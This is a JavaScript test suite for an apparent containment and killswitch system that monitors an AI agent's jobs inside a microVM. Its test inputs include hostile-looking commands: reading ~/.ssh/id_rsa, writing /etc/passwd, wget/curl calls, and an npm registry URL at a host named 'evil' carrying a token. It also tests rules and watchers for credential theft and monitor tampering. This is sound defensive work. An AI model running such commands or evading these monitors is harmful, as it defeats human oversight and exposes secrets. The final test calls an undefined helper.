// SPDX-FileCopyrightText: 2026 Julen Gamboa <j.a.r.gamboa@gmail.com>
// SPDX-License-Identifier: AGPL-3.0-or-later

// Guest containment step 1: taxonomy stability, severity-tiered killswitch
// decision core, and structured log schema/redaction (design
// GUEST_CONTAINMENT_DESIGN.md sections 2, 2.0, 4, 5). The decision core lives
// in the fixture script and is exercised through its test hooks.

import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { execFile, spawn, spawnSync } from "node:child_process";
import { createReadStream } from "node:fs";
import { mkdirSync, writeFileSync, existsSync } from "node:fs";
import { mkdtemp, readFile, readdir, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const FIXTURE = join(ROOT, "scripts/enforcement/linux_microvm_remote_fixture.sh");
const TAXONOMY_FILE = join(ROOT, "scripts/enforcement/guest_containment_taxonomy.v1.json");
// Pinned digest of the shipped taxonomy (design section 2: pinned per
// repository revision; the fixture embeds and verifies the same digest).
const TAXONOMY_SHA256 = "e77fb07387ebfad66030981f05b21c300e9d3e2a96d826dd3ca2b60e91411f4b";
const INITRAMFS = "a".repeat(64);

function runFixture(args, env = {}, stdin = undefined) {
  return new Promise((resolve, reject) => {
    execFile("bash", [FIXTURE, ...args], { env: { ...process.env, ...env }, input: stdin }, (error, stdout, stderr) => {
      if (error) reject(Object.assign(error, { stderr }));
      else resolve(stdout);
    });
  });
}

function decide(stateDir, ruleId, subject = "") {
  return runFixture(["--gc-decide", stateDir, ruleId, subject]).then(JSON.parse);
}

async function tempState() {
  return mkdtemp(join(tmpdir(), "gc-test-"));
}

const EXPECTED_RULE_IDS = [
  "GC-PKG-001", "GC-PKG-002", "GC-PKG-003",
  "GC-FSW-001", "GC-FSW-002", "GC-FSW-003",
  "GC-SHR-001", "GC-SHR-002",
  "GC-NET-001", "GC-NET-002",
  "GC-CRED-001", "GC-CRED-002",
  "GC-LOG-001", "GC-LOG-002",
  "GC-TOOL-001", "GC-TOOL-002",
  "GC-PROBE-001", "GC-PROBE-002", "GC-PROBE-003",
];

const TIER_CLASSES = {
  CRITICAL: ["GC-CRED", "GC-LOG", "GC-TOOL"],
  HIGH: ["GC-NET", "GC-SHR"],
  ELEVATED: ["GC-PKG", "GC-FSW"],
};

test("taxonomy loads, is complete, and its SHA-256 is stable", async () => {
  const raw = await readFile(TAXONOMY_FILE, "utf8");
  const taxonomy = JSON.parse(raw);
  assert.equal(taxonomy.schema, "guest-containment-taxonomy.v1");
  assert.deepEqual(taxonomy.rules.map((r) => r.id), EXPECTED_RULE_IDS);
  for (const rule of taxonomy.rules) {
    assert.equal(rule.action, "deny");
    for (const key of ["id", "class", "severity", "action", "match", "evidence", "since"]) {
      assert.ok(rule[key], `rule ${rule.id} missing ${key}`);
    }
  }
  for (const [tier, classes] of Object.entries(TIER_CLASSES)) {
    for (const cls of classes) {
      const rule = taxonomy.rules.find((r) => r.class === cls);
      assert.equal(rule.severity, tier, `${cls} must be ${tier}`);
    }
  }
  assert.equal(
    createHash("sha256").update(raw).digest("hex"),
    TAXONOMY_SHA256,
    "shipped taxonomy digest changed; re-pin deliberately",
  );
});

test("fixture embeds the exact shipped taxonomy and self-verifies its digest", async () => {
  const sha = (await runFixture(["--gc-taxonomy-sha"])).trim();
  assert.equal(sha, TAXONOMY_SHA256);
  const fixtureSource = await readFile(FIXTURE, "utf8");
  const start = fixtureSource.indexOf("<<'GC_TAXONOMY_EOF'\n");
  const end = fixtureSource.indexOf("\nGC_TAXONOMY_EOF", start);
  assert.ok(start > 0 && end > start, "embedded taxonomy heredoc not found");
  const embedded = fixtureSource.slice(start + "<<'GC_TAXONOMY_EOF'\n".length, end) + "\n";
  const shipped = await readFile(TAXONOMY_FILE, "utf8");
  assert.equal(embedded, shipped, "embedded copy drifted from the shipped taxonomy");
});

test("CRITICAL rule trips the killswitch immediately", async () => {
  const dir = await tempState();
  try {
    const d = await decide(join(dir, "s"), "GC-CRED-001", "cat ~/.ssh/id_rsa");
    assert.equal(d.tripped, true);
    assert.equal(d.tier, "CRITICAL");
    assert.equal(d.mode, "immediate");
    const log = await readFile(join(dir, "s/containment.log.jsonl"), "utf8");
    const lines = log.trim().split("\n").map((l) => JSON.parse(l));
    const ks = lines.at(-1);
    assert.equal(ks.schema, "agentic-driver.guest-containment.killswitch.v1");
    assert.equal(ks.trigger.rule, "GC-CRED-001");
    assert.equal(ks.trigger.mode, "immediate");
    assert.equal(ks.final, true);
    assert.match(ks.logSha256, /^[0-9a-f]{64}$/);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("HIGH rule trips the killswitch immediately", async () => {
  const dir = await tempState();
  try {
    const d = await decide(join(dir, "s"), "GC-NET-002", "wget http://example.invalid");
    assert.equal(d.tripped, true);
    assert.equal(d.tier, "HIGH");
    assert.equal(d.mode, "immediate");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("ELEVATED rules accumulate pressure and trip only at the threshold", async () => {
  const dir = await tempState();
  const state = join(dir, "s");
  try {
    for (let i = 0; i < 4; i++) {
      const d = await decide(state, "GC-PKG-001", `npm install pkg-${i}`);
      assert.equal(d.tripped, false, `pressure ${d.pressure} must not trip below threshold`);
      assert.equal(d.tier, "ELEVATED");
      assert.equal(d.mode, "aggregate");
    }
    // Pressure is a per-class aggregate (design section 2.0).
    const peer = await decide(state, "GC-FSW-001", "/etc/passwd");
    assert.equal(peer.tripped, false);
    assert.equal(peer.pressure, 1);
    const trip = await decide(state, "GC-PKG-002", "npm publish");
    assert.equal(trip.tripped, true, "aggregate pressure within one class trips the killswitch");
    assert.equal(trip.mode, "aggregate");
    assert.equal(trip.pressure, 5);
    assert.equal(trip.threshold, 5);
    const log = await readFile(join(state, "containment.log.jsonl"), "utf8");
    const ks = JSON.parse(log.trim().split("\n").at(-1));
    assert.equal(ks.trigger.mode, "aggregate");
    assert.equal(ks.trigger.pressure, 5);
    assert.equal(ks.trigger.threshold, 5);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("ANOMALY residual class accumulates and does not trip below threshold", async () => {
  const dir = await tempState();
  const state = join(dir, "s");
  try {
    for (let i = 0; i < 9; i++) {
      const d = await decide(state, "unknown", `novel-path-${i}`);
      assert.equal(d.tripped, false, `anomaly pressure ${d.pressure} must not trip below threshold`);
      assert.equal(d.class, "unknown");
      assert.equal(d.tier, "ANOMALY");
    }
    const trip = await decide(state, "unknown", "novel-path-9");
    assert.equal(trip.tripped, true);
    assert.equal(trip.threshold, 10);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("killswitch log carries the versioned schema, taxonomy digest, and redaction", async () => {
  const dir = await tempState();
  try {
    const out = JSON.parse(
      await runFixture(["--gc-log", join(dir, "s"), "watcher:fs", "GC-FSW-001", "path", "API_KEY=supersecret123 write /etc/cron.d/x"]),
    );
    assert.equal(out.schema, "agentic-driver.guest-containment.log.v1");
    assert.equal(out.taxonomy, "guest-containment-taxonomy.v1");
    assert.equal(out.taxonomySha256, TAXONOMY_SHA256);
    assert.equal(out.event.action, "deny");
    assert.equal(out.event.seq, 1);
    assert.match(out.event.ts, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/);
    assert.equal(out.event.subject.type, "path");
    assert.doesNotMatch(out.event.subject.value, /supersecret123/);
    assert.match(out.event.subject.value, /\[REDACTED\]/);
    const stored = JSON.parse(await readFile(join(dir, "s/containment.log.jsonl"), "utf8"));
    assert.deepEqual(stored, out);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("log truncates oversized subject values to the 512-byte bound", async () => {
  const dir = await tempState();
  try {
    const out = JSON.parse(
      await runFixture(["--gc-log", join(dir, "s"), "shim", "GC-FSW-001", "path", "x".repeat(4096)]),
    );
    assert.ok(Buffer.byteLength(out.event.subject.value) <= 512);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

// --- Step 2: detection (shims, watchers, liveness) ---

test("shim denies an unlisted executable after the learning window with a redacted command line", async () => {
  const dir = await tempState();
  try {
    // Window forced closed: nothing is learned, so even the first invocation
    // is judged against the locked allowlist.
    const out = JSON.parse(await runFixture([
      "--gc-shim", join(dir, "s"), "npm", "install", "--registry=https://evil/TOKEN=abc123",
    ], { GC_LEARNING_WINDOW_SECONDS: "0" }));
    assert.equal(out.decision, "deny");
    assert.equal(out.rule, "GC-PKG-001");
    const log = await readFile(join(dir, "s/containment.log.jsonl"), "utf8");
    const event = JSON.parse(log.trim().split("\n").at(-1)).event;
    assert.doesNotMatch(event.subject.value, /abc123/);
    assert.match(event.subject.value, /\[REDACTED\]/);
    assert.match(event.subject.value, /npm install/);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("observed-first-use allowlist: learning window allows, lock denies unlisted", async () => {
  const dir = await tempState();
  try {
    // Long window: events allowed and recorded as learned.
    const learn = JSON.parse(await runFixture([
      "--gc-shim", join(dir, "s"), "ls", "-la",
    ], { GC_LEARNING_WINDOW_SECONDS: "999" }));
    assert.equal(learn.decision, "allow");
    assert.equal(learn.learned, true);
    // Force the window closed: the observed tool stays allowed...
    const locked = JSON.parse(await runFixture([
      "--gc-shim", join(dir, "s"), "ls",
    ], { GC_LEARNING_WINDOW_SECONDS: "0" }));
    assert.equal(locked.decision, "allow");
    assert.equal(locked.learned, false);
    // ...while an unobserved tool is now denied.
    const unlisted = JSON.parse(await runFixture([
      "--gc-shim", join(dir, "s"), "curl", "http://example.invalid",
    ], { GC_LEARNING_WINDOW_SECONDS: "0" }));
    assert.equal(unlisted.decision, "deny");
    assert.equal(unlisted.rule, "GC-NET-002");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("classified dangerous commands deny even during the learning window", async () => {
  const dir = await tempState();
  try {
    const out = JSON.parse(await runFixture([
      "--gc-shim", join(dir, "s"), "pip", "install", "requests",
    ]));
    assert.equal(out.decision, "deny");
    assert.equal(out.rule, "GC-PKG-001");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("fs-watcher detects writes outside the allowlist and shim-tree tampering", async () => {
  const dir = await tempState();
  try {
    assert.equal(JSON.parse(await runFixture(["--gc-fs-detect", join(dir, "s"), "/tmp/session/scratch.txt"])).decision, "allow");
    const deny = JSON.parse(await runFixture(["--gc-fs-detect", join(dir, "s"), "/etc/passwd"]));
    assert.equal(deny.decision, "deny");
    assert.equal(deny.rule, "GC-FSW-001");
    const selfMod = JSON.parse(await runFixture(["--gc-fs-detect", join(dir, "s"), "/shims/wget"]));
    assert.equal(selfMod.rule, "GC-FSW-002");
    // find -newer sweep fallback path: multiple candidate paths in one sweep.
    const sweep = (await runFixture(["--gc-fs-sweep", join(dir, "s2"), "/tmp/session/a", "/var/lib/evil"]))
      .trim().split("\n").map(JSON.parse);
    assert.deepEqual(sweep.map((d) => d.decision), ["allow", "deny"]);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("net-watcher denies any socket entry immediately (GC-NET-001)", async () => {
  const dir = await tempState();
  try {
    const out = JSON.parse(await runFixture([
      "--gc-net-detect", join(dir, "s"), "  1: 00350033:0035 00000000:0000 0A",
    ]));
    assert.equal(out.decision, "deny");
    assert.equal(out.rule, "GC-NET-001");
    const log = await readFile(join(dir, "s/containment.log.jsonl"), "utf8");
    const ks = JSON.parse(log.trim().split("\n").at(-1));
    assert.equal(ks.schema, "agentic-driver.guest-containment.killswitch.v1");
    assert.equal(ks.trigger.rule, "GC-NET-001");
    // The guest supervisor observes the kill flag.
    assert.equal(await readFile(join(dir, "s/kill"), "utf8"), "immediate\n");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("a dead monitor loop is a containment-integrity killswitch", async () => {
  const dir = await tempState();
  try {
    const out = JSON.parse(await runFixture(["--gc-liveness", join(dir, "s"), "1 0 1"]));
    assert.equal(out.decision, "deny");
    assert.equal(out.rule, "containment-integrity");
    assert.equal(out.tier, "CRITICAL");
    assert.equal(out.mode, "immediate");
    const healthy = JSON.parse(await runFixture(["--gc-liveness", join(dir, "s2"), "1 1 1"]));
    assert.equal(healthy.decision, "allow");
    const log = await readFile(join(dir, "s/containment.log.jsonl"), "utf8");
    const ks = JSON.parse(log.trim().split("\n").at(-1));
    assert.equal(ks.trigger.rule, "containment-integrity");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("guest payload: init embeds the core verbatim, shims dispatch, proof mode unchanged", async () => {
  const fixtureSource = await readFile(FIXTURE, "utf8");
  // The guest init runs the containment session only when /job.sh exists;
  // the marker proof path is byte-identical in behavior (mounts, marker, sync, poweroff).
  assert.match(fixtureSource, /if \[ ! -x \/job\.sh \]; then\n  sync\n  \/bin\/poweroff -f\nfi/);
  assert.match(fixtureSource, /PATH=\/shims:\/bin/);
  assert.ok(fixtureSource.includes('gc_liveness'));
  assert.ok(fixtureSource.includes('gc_net_detect'));
  assert.ok(fixtureSource.includes('gc_fs_detect'));
  assert.ok(fixtureSource.includes("cat >\"$root/gc/core.sh\" <<'GC_CORE_EOF'"), "core embeds via heredoc, not awk-from-$0");
  // inotifyd upgrade is optional; the sweep fallback is unconditional in the fs loop branch.
  assert.match(fixtureSource, /have_inotifyd=true/);
  assert.ok(fixtureSource.includes('find / -newer'));
});

// --- Step 3: containment envelope + host receipt v2 ---

import {
  LINUX_MICROVM_CUTOVER_SCHEMA,
  LINUX_MICROVM_CUTOVER_SCHEMA_V2,
  parseReceipt,
  runLinuxMicroVMCutover,
  validateLinuxMicroVMReceipt,
} from "../scripts/enforcement/linux_microvm_cutover_pi.js";

function compact(value) {
  return JSON.stringify(value);
}

function stubFactsShape(fixtureId, host = "test-microvm-host") {
  return {
    host, arch: "x86_64", kernel: "6.8.0-generic",
    libvirt: "qemu:///system",
    qemu: "QEMU emulator version 10.2.1",
    qemuBinaryPath: "/usr/bin/qemu-system-x86_64",
    kvmAccessible: true,
    fixtureDomain: `agentic-driver-${fixtureId}`, fixtureDomainState: "absent",
  };
}

function stubV1Receipt(fixtureId, scriptHash, host = "test-microvm-host") {
  const domain = `agentic-driver-${fixtureId}`;
  const marker = `AGENTIC_MICROVM_PROBE:${fixtureId}`;
  const digest = (value) => createHash("sha256").update(value).digest("hex");
  return {
    schema: LINUX_MICROVM_CUTOVER_SCHEMA, ok: true, status: "VERIFIED",
    authorityCreated: false, runtimeActivated: false, persisted: false,
    identity: { remoteHost: host, fixtureId, domain },
    marker: { value: marker, sha256: digest(marker) },
    scriptHash, initramfsSha256: INITRAMFS,
    teardown: {
      domain: { name: domain, transient: true, destroyOnExit: true, destroyRequested: true, absent: true, checked: true, check: "virsh dominfo/list" },
      acl: { beforeSha256: "b".repeat(64), afterSha256: "b".repeat(64), equal: true, checked: true, initramfsEntryRemoved: true },
    },
    context: {
      filesystem: { summary: "disk=absent host-share=absent credentials=absent gpu=absent", disk: false, hostShare: false, credentials: false, gpu: false, sha256: digest(JSON.stringify({ disk: false, hostShare: false, credentials: false, gpu: false, initramfsSha256: INITRAMFS })) },
      network: { summary: "network=absent", guest: false, sha256: digest(JSON.stringify({ network: false })) },
      guestMounts: ["proc", "sysfs", "devtmpfs"],
    },
  };
}

function containmentBlock(logSha, { tripped = true, rule = "GC-CRED-001" } = {}) {
  return {
    schema: "agentic-driver.guest-containment.log.v1",
    taxonomySha256: TAXONOMY_SHA256,
    logSha256: logSha,
    events: 3,
    denials: 2,
    probes: 0,
    concealmentIndex: 0,
    histogram: tripped ? { "GC-CRED": 1, unknown: 1 } : { unknown: 1 },
    ...(tripped ? { killReportPath: "/fixtures/fid/kill-report.json" } : {}),
    killswitch: {
      tripped,
      rule: tripped ? rule : null,
      class: tripped ? "GC-CRED" : null,
      tier: tripped ? "CRITICAL" : null,
      guestPoweroff: true,
      final: true,
    },
  };
}

function stubV2Receipt(fixtureId, scriptHash, logSha, options = {}) {
  const receipt = stubV1Receipt(fixtureId, scriptHash);
  receipt.schema = LINUX_MICROVM_CUTOVER_SCHEMA_V2;
  receipt.containment = containmentBlock(logSha, options);
  return receipt;
}

function envelopeTranscript(fixtureId, payloadLines, { crlf = true, includeEnvelope = true, digestOverride = null } = {}) {
  const payload = payloadLines.join("\n") + "\n";
  // Guest semantics (design section 5): the trigger event is appended, the
  // digest covers the log up to and including it, then the terminal killswitch
  // line embedding that digest is appended.
  const event = compact({
    schema: "agentic-driver.guest-containment.killswitch.v1", session: fixtureId,
    trigger: { rule: "GC-CRED-001", class: "GC-CRED", tier: "CRITICAL", mode: "immediate", pressure: null, threshold: null },
    final: true,
  });
  const chained = payload + event + "\n";
  const sha = digestOverride ?? createHash("sha256").update(chained).digest("hex");
  const killswitch = compact({
    schema: "agentic-driver.guest-containment.killswitch.v1", session: fixtureId,
    trigger: { rule: "GC-CRED-001", class: "GC-CRED", tier: "CRITICAL", mode: "immediate", pressure: null, threshold: null },
    logSha256: sha, final: true,
  });
  const full = chained + killswitch + "\n";
  let body = `noise\r\nAGENTIC_MICROVM_PROBE:${fixtureId}\r\n`;
  if (includeEnvelope) {
    const b64 = Buffer.from(full, "utf8").toString("base64").replace(/(.{76})/g, "$1\n");
    body += `AGENTIC_CONTAINMENT_BEGIN:${fixtureId}\r\n${crlf ? b64.replaceAll("\n", "\r\n") : b64}\r\nAGENTIC_CONTAINMENT_END:${fixtureId}\r\nmore unbound guest output\r\n`;
  }
  return { body, expectedLogSha: sha, full };
}

function envelopePayloadLines(fixtureId) {
  return [
    compact({ schema: "agentic-driver.guest-containment.log.v1", session: fixtureId, taxonomy: "guest-containment-taxonomy.v1", taxonomySha256: TAXONOMY_SHA256,
      event: { ts: "2026-01-01T00:00:00Z", seq: 1, source: "shim", class: "unknown", action: "deny", subject: { type: "exec", value: "npm install [REDACTED]" } } }),
    compact({ schema: "agentic-driver.guest-containment.log.v1", session: fixtureId, taxonomy: "guest-containment-taxonomy.v1", taxonomySha256: TAXONOMY_SHA256,
      event: { ts: "2026-01-01T00:00:01Z", seq: 2, source: "shim", class: "GC-CRED", action: "deny", subject: { type: "exec", value: "cat ~/.ssh/id_rsa" } } }),
  ];
}

function envelopeExtract(transcript, fixtureId, reportPath = undefined) {
  const args = reportPath ? [transcript, fixtureId, reportPath] : [transcript, fixtureId];
  return new Promise((resolve) => {
    const child = spawnSync("bash", [FIXTURE, "--gc-envelope-extract", ...args], { encoding: "utf8" });
    resolve({ status: child.status, stdout: child.stdout, stderr: child.stderr });
  });
}

test("envelope parse recomputes the log digest from a pty-mangled (CRLF) transcript", async () => {
  const fixtureId = "microvm-" + "a".repeat(24);
  const { body, expectedLogSha } = envelopeTranscript(fixtureId, envelopePayloadLines(fixtureId));
  const dir = await tempState();
  const transcript = join(dir, "console.typescript");
  await readFile(FIXTURE, "utf8"); // sanity
  const { writeFileSync } = await import("node:fs");
  writeFileSync(transcript, body);
  const result = await envelopeExtract(transcript, fixtureId);
  assert.equal(result.status, 0, result.stderr);
  const block = JSON.parse(result.stdout);
  assert.equal(block.taxonomySha256, TAXONOMY_SHA256);
  assert.equal(block.logSha256, expectedLogSha, "digest recomputed from decoded payload must match the guest log");
  // Records counted up to the trigger event (terminal killswitch line excluded).
  assert.equal(block.events, 3);
  assert.equal(block.denials, 2);
  assert.equal(block.killswitch.tripped, true);
  assert.equal(block.killswitch.rule, "GC-CRED-001");
  assert.equal(block.killswitch.guestPoweroff, true);
  assert.equal(block.killswitch.final, true);
  await rm(dir, { recursive: true, force: true });
});

test("missing containment evidence fails closed (containment-evidence-missing)", async () => {
  const fixtureId = "microvm-" + "b".repeat(24);
  const dir = await tempState();
  const transcript = join(dir, "console.typescript");
  const { writeFileSync } = await import("node:fs");
  writeFileSync(transcript, `noise\r\nAGENTIC_MICROVM_PROBE:${fixtureId}\r\nno envelope here\r\n`);
  const result = await envelopeExtract(transcript, fixtureId);
  assert.equal(result.status, 1);
  assert.match(result.stderr, /containment-evidence-missing/);
  await rm(dir, { recursive: true, force: true });
});

test("a clean session without killswitch ends with the session-end terminal event", async () => {
  const fixtureId = "microvm-" + "c".repeat(24);
  const lines = envelopePayloadLines(fixtureId);
  lines.push(compact({ schema: "agentic-driver.guest-containment.log.v1", session: fixtureId, taxonomy: "guest-containment-taxonomy.v1", taxonomySha256: TAXONOMY_SHA256,
    event: { ts: "2026-01-01T00:00:02Z", seq: 3, source: "supervisor", class: "session-end", action: "complete", summary: true } }));
  const payload = lines.join("\n") + "\n";
  const b64 = Buffer.from(payload, "utf8").toString("base64").replace(/(.{76})/g, "$1\n");
  const dir = await tempState();
  const transcript = join(dir, "console.typescript");
  const { writeFileSync } = await import("node:fs");
  writeFileSync(transcript, `AGENTIC_CONTAINMENT_BEGIN:${fixtureId}\r\n${b64.replaceAll("\n", "\r\n")}\r\nAGENTIC_CONTAINMENT_END:${fixtureId}\r\n`);
  const result = await envelopeExtract(transcript, fixtureId);
  assert.equal(result.status, 0, result.stderr);
  const block = JSON.parse(result.stdout);
  assert.equal(block.killswitch.tripped, false);
  assert.equal(block.killswitch.rule, null);
  await rm(dir, { recursive: true, force: true });
});

test("a tampered killswitch digest chain is rejected", async () => {
  const fixtureId = "microvm-" + "d".repeat(24);
  const { body } = envelopeTranscript(fixtureId, envelopePayloadLines(fixtureId), { digestOverride: "0".repeat(64) });
  const dir = await tempState();
  const transcript = join(dir, "console.typescript");
  const { writeFileSync } = await import("node:fs");
  writeFileSync(transcript, body);
  const result = await envelopeExtract(transcript, fixtureId);
  assert.notEqual(result.status, 0);
  await rm(dir, { recursive: true, force: true });
});

test("v2 receipt with a closed containment block validates; killswitch trip is VERIFIED", () => {
  const fixtureId = "microvm-" + "e".repeat(24);
  const scriptHash = "1".repeat(64);
  const logSha = "2".repeat(64);
  const receipt = stubV2Receipt(fixtureId, scriptHash, logSha);
  const validated = validateLinuxMicroVMReceipt(receipt, stubFactsShape(fixtureId), fixtureId, scriptHash, { containment: true });
  assert.equal(validated.status, "VERIFIED");
  assert.equal(validated.containment.killswitch.tripped, true);
});

test("containment run without the v2 receipt is containment-evidence-missing (fail-closed)", () => {
  const fixtureId = "microvm-" + "f".repeat(24);
  const scriptHash = "1".repeat(64);
  assert.throws(
    () => validateLinuxMicroVMReceipt(stubV1Receipt(fixtureId, scriptHash), stubFactsShape(fixtureId), fixtureId, scriptHash, { containment: true }),
    (error) => error.reasonCode === "containment-evidence-missing",
  );
});

test("v1 receipts without a containment block still validate (backward compat)", () => {
  const fixtureId = "microvm-" + "0".repeat(24);
  const scriptHash = "1".repeat(64);
  const validated = validateLinuxMicroVMReceipt(stubV1Receipt(fixtureId, scriptHash), stubFactsShape(fixtureId), fixtureId, scriptHash);
  assert.equal(validated.status, "VERIFIED");
});

test("containment block fields are closed and digest-typed", () => {
  const fixtureId = "microvm-" + "9".repeat(24);
  const scriptHash = "1".repeat(64);
  const bad = stubV2Receipt(fixtureId, scriptHash, "2".repeat(64));
  bad.containment.logSha256 = "zz";
  assert.throws(() => validateLinuxMicroVMReceipt(bad, stubFactsShape(fixtureId), fixtureId, scriptHash, { containment: true }));
  const badHistogram = stubV2Receipt(fixtureId, scriptHash, "2".repeat(64));
  badHistogram.containment.histogram = { "GC-CRED": "two" };
  assert.throws(() => validateLinuxMicroVMReceipt(badHistogram, stubFactsShape(fixtureId), fixtureId, scriptHash, { containment: true }));
  const badTrip = stubV2Receipt(fixtureId, scriptHash, "2".repeat(64));
  badTrip.containment.killswitch.rule = null;
  assert.throws(() => validateLinuxMicroVMReceipt(badTrip, stubFactsShape(fixtureId), fixtureId, scriptHash, { containment: true }));
});

test("receipt-extra-output is relaxed solely for envelope markers on v2 receipts", () => {
  const fixtureId = "microvm-" + "7".repeat(24);
  const scriptHash = "1".repeat(64);
  const v2 = JSON.stringify(stubV2Receipt(fixtureId, scriptHash, "2".repeat(64)));
  const withEnvelope = `AGENTIC_MICROVM_RECEIPT: ${v2}\nAGENTIC_CONTAINMENT_BEGIN:${fixtureId}\nAGENTIC_CONTAINMENT_END:${fixtureId}\n`;
  assert.equal(parseReceipt(withEnvelope).schema, LINUX_MICROVM_CUTOVER_SCHEMA_V2);
  // Other unbound output still fails, even on v2.
  assert.throws(() => parseReceipt(`AGENTIC_MICROVM_RECEIPT: ${v2}\nrandom guest chatter\n`), (error) => error.reasonCode === "receipt-extra-output");
  // Envelope markers beside a v1 receipt are still extra output.
  const v1 = JSON.stringify(stubV1Receipt(fixtureId, scriptHash));
  assert.throws(() => parseReceipt(`AGENTIC_MICROVM_RECEIPT: ${v1}\nAGENTIC_CONTAINMENT_BEGIN:${fixtureId}\n`), (error) => error.reasonCode === "receipt-extra-output");
});

// --- Step 4: elastic resource allocation (user-configured, never model-set) ---

import {
  registerLinuxMicroVMCutoverInterface,
  LINUX_MICROVM_CUTOVER_TOOL,
} from "../scripts/enforcement/linux_microvm_cutover_pi.js";

function targetConfigFile(dir, extra = {}) {
  const path = join(dir, "microvm-target.v1.json");
  writeFileSync(path, JSON.stringify({ schema: "agentic-driver.microvm-target.v1", sshTarget: "user@test-microvm-host", ...extra }));
  return path;
}

function allocationHarness(confirmBodies, executedArgs) {
  return {
    context: { mode: "tui", hasUI: true, ui: { confirm: async (_title, body) => { confirmBodies.push(body); return true; } } },
    options: {
      isolationSwitch: { get: () => true },
      targetPath: undefined,
      execute: (executable, args) => {
        executedArgs.push([executable, ...args]);
        // The fixture run carries the fixture id; build a matching receipt.
        const fixtureId = executable === "ssh" ? args[4] : /microvm-[0-9a-f]{24}/.exec(args[1])?.[0];
        const scriptHash = executable === "ssh" ? args[5] : createHash("sha256").update(arguments[2]?.input ?? "").digest("hex");
        return { code: 0, stdout: `AGENTIC_MICROVM_RECEIPT: ${JSON.stringify(stubV1Receipt(fixtureId ?? "microvm-" + "3".repeat(24), scriptHash))}\n`, stderr: "" };
      },
      observeFacts: (execute, fixtureId) => stubFactsShape(fixtureId),
    },
  };
}

test("configured allocation flows into the confirmation text and fixture args", async () => {
  const dir = await tempState();
  try {
    const targetPath = targetConfigFile(dir, { vcpu: 4, memoryMiB: 2048 });
    const confirmBodies = [];
    const executed = [];
    const harness = allocationHarness(confirmBodies, executed);
    const value = await runLinuxMicroVMCutover(harness.context, { ...harness.options, targetPath, userConfigPath: "/nonexistent/user-config.json" });
    assert.equal(value.ok, true, JSON.stringify(value.reason ?? {}));
    assert.match(confirmBodies[0], /\b4 vCPU, 2048 MiB\b/);
    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
    assert.ok(fixtureExec, "fixture run expected over ssh");
    // Identity args are fixture-internal; the allocation args are last.
    assert.deepEqual(fixtureExec.slice(-2), ["4", "2048"]);
    assert.equal(fixtureExec.length, 9); // exe + target bash -s -- id hash vcpu mem
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("unconfigured allocation keeps the proof defaults (1 vCPU, 128 MiB)", async () => {
  const dir = await tempState();
  try {
    const targetPath = targetConfigFile(dir);
    const confirmBodies = [];
    const executed = [];
    const harness = allocationHarness(confirmBodies, executed);
    const value = await runLinuxMicroVMCutover(harness.context, { ...harness.options, targetPath, userConfigPath: "/nonexistent/user-config.json" });
    assert.equal(value.ok, true, JSON.stringify(value.reason ?? {}));
    assert.match(confirmBodies[0], /\b1 vCPU, 128 MiB\b/);
    const fixtureExec = executed.find(([exe, ...args]) => exe === "ssh" && args[1] === "bash");
    assert.deepEqual(fixtureExec.slice(-2), ["1", "128"]);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("an invalid allocation rejects the whole target config (fail-closed)", async () => {
  const dir = await tempState();
  try {
    const targetPath = targetConfigFile(dir, { vcpu: 0 });
    const confirmBodies = [];
    const executed = [];
    const harness = allocationHarness(confirmBodies, executed);
    const value = await runLinuxMicroVMCutover(harness.context, { ...harness.options, targetPath, userConfigPath: "/nonexistent/user-config.json" });
    assert.equal(value.ok, false);
    assert.equal(value.reason.code, "target-not-configured");
    assert.equal(executed.length, 0, "no run may start with an invalid allocation");
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test("the model cannot set the allocation: the tool surface stays closed", async () => {
  const tools = {};
  const pi = { registerTool: (tool) => { tools[tool.name] = tool; }, registerCommand: () => {} };
  registerLinuxMicroVMCutoverInterface(pi);
  const tool = tools[LINUX_MICROVM_CUTOVER_TOOL];
  assert.equal(tool.parameters.additionalProperties, false);
  assert.deepEqual(Object.keys(tool.parameters.properties), ["target"]);
  // Passing an allocation-looking parameter is rejected before any execution.
  const executed = [];
  let returned;
  const context = { mode: "tui", hasUI: true, ui: { confirm: async () => true, notify: () => {} } };
  const result = await tool.execute("id", { vcpu: 64 }, undefined, undefined, context);
  returned = result;
  assert.equal(returned.details.ok, false);
  assert.equal(returned.details.reason.code, "model-parameters-not-allowed");
});

// --- Repair step: B1, H1, H2, H4, M1, M3, M4 ---

test("B1: the real receipt printf emits parseable JSON for v1 and v2 shapes", () => {
  const common = ["v1", "test-host", "microvm-" + "4".repeat(24), "agentic-driver-fid",
    "AGENTIC_MICROVM_PROBE:x", "a".repeat(64), "1".repeat(64), "b".repeat(64)];
  const v1 = runFixtureSync([
    "--gc-receipt-print", ...common, "-", "agentic-driver-fid", "true", "true", "c".repeat(64), "c".repeat(64), "d".repeat(64), "e".repeat(64),
  ]);
  const parsed1 = JSON.parse(v1);
  assert.equal(parsed1.schema, "v1");
  assert.equal(parsed1.containment, undefined);
  const segment = JSON.stringify(containmentBlock("2".repeat(64)));
  const v2 = runFixtureSync([
    "--gc-receipt-print", ...common, `,"containment":${segment}`,
    "agentic-driver-fid", "true", "true", "c".repeat(64), "c".repeat(64), "d".repeat(64), "e".repeat(64),
  ]);
  const parsed2 = JSON.parse(v2);
  assert.equal(parsed2.containment.killswitch.tripped, true);
});

